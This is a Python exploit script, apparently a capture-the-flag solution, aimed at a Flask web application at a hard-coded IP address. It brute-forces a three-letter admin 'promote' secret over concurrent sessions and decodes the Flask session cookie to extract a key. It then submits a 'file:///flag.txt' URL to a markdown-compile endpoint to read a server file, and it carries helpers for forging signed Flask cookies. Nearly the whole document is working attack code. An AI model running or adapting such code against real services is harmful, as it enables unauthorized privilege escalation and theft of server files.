import requests
import time
import string
import os
import random
from concurrent.futures import ThreadPoolExecutor
from itertools import product

import base64
import json
import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, secret_key):
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )

        return URLSafeTimedSerializer(
            [secret_key], 
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )

def encodeFlaskCookie(secret_key, cookieDict):
    return SimpleSecureCookieSessionInterface() \
            .get_signing_serializer(secret_key) \
            .dumps(cookieDict)

def decodeFlaskCookie(secret_key, cookie):
    return SimpleSecureCookieSessionInterface() \
            .get_signing_serializer(secret_key) \
            .loads(cookie)

def get_data_from_flask_session(session_cookie: str):
    data = session_cookie.split('.')[1].encode()
    for padding_length in range(3):
        try:
            data = zlib.decompress(base64.urlsafe_b64decode(data + b'=' * padding_length)).decode()
        except:
            continue

        break
    else:
        raise Exception("Failed to get data from flask session")

    data = json.loads(data)
    return data

URL = 'http://3.37.52.71:5000'
#URL = 'http://127.0.0.1:5000'
SECRETS = [''.join(secret) + '\n' for secret in product(string.ascii_uppercase, repeat=3)]

def gen_username_password():
    return os.urandom(16).hex(), os.urandom(16).hex()

def register(s: requests.Session, username: str, password: str):
    resp = s.post(f'{URL}/api/auth/register', json={'username': username, 'password': password})
    print(resp.text)

def login(s: requests.Session, username: str, password: str):
    resp = s.post(f'{URL}/api/auth/login', json={'username': username, 'password': password})
    print(resp.text)

def promote(s: requests.Session, secret: str):
    print(secret)
    resp = s.post(f'{URL}/api/auth/promote', json={'secret': secret}, timeout=10)
    print(resp.text)
    return resp.status_code == 200

def main(max_workers=10):
    workers = [(requests.Session(), *gen_username_password()) for _ in range(max_workers)]
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        pool.map(register, *zip(*workers))
        pool.map(login, *zip(*workers))

        for _ in range(5):
            secrets = random.sample(SECRETS, k=max_workers)
            #print(list(zip([worker[0] for worker in workers], secrets)))
            results = pool.map(lambda args: promote(*args), list(zip([worker[0] for worker in workers], secrets)))

            for success, worker, secret in zip(results, workers, secrets):
                if success:
                    return (worker[1], worker[2], secret)
                
            time.sleep(1.5)
    
    return False

while True:
    result = main(3)
    if result:
        print("Success:", result)
        break

username, password, secret = result
s = requests.Session()
login(s, username, password)
promote(s, secret)

session = s.cookies.get('session')
data = get_data_from_flask_session(session)
print(data)
r = s.post(f'{URL}/api/compile/markdown', json={'url': 'file:///flag.txt', 'key': data.get('key')})
print(r.text)